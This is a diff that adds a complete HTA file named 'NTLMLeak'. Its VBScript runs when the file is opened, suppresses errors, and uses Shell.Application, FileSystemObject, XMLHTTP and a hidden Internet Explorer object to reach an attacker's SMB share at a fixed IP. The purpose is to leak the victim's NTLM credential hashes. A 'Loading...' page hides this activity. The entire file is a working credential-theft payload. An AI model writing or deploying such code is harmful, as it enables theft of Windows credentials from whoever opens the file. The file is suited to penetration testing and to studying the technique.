@@ -1,0 +1,36 @@
+<html>
+  <head>
+    <HTA:APPLICATION ID="NTLMLeak" APPLICATIONNAME="NTLMLeak" BORDER="thin" />
+    <script language="VBScript">
+      On Error Resume Next
+      attacker = "\\192.168.247.131\leak"
+
+      ' Shell COM object (triggers share access)
+      Set sh = CreateObject("Shell.Application")
+      sh.NameSpace attacker
+
+      ' FileSystemObject COM
+      Set fso = CreateObject("Scripting.FileSystemObject")
+      fso.OpenTextFile attacker & "\trigger.txt", 1
+
+      ' MSXML2
+      Set http = CreateObject("MSXML2.XMLHTTP")
+      http.open "GET", attacker & "\test", False
+      http.send
+
+      ' IE COM nav to UNC path
+      Set ie = CreateObject("InternetExplorer.Application")
+      ie.Visible = False
+      ie.Navigate "file://" & attacker & "\xaml.xaml"
+
+      ' Cleanup
+      Set sh = Nothing
+      Set fso = Nothing
+      Set http = Nothing
+      Set ie = Nothing
+    </script>
+  </head>
+  <body>
+    <h1>Loading...</h1>
+  </body>
+</html>
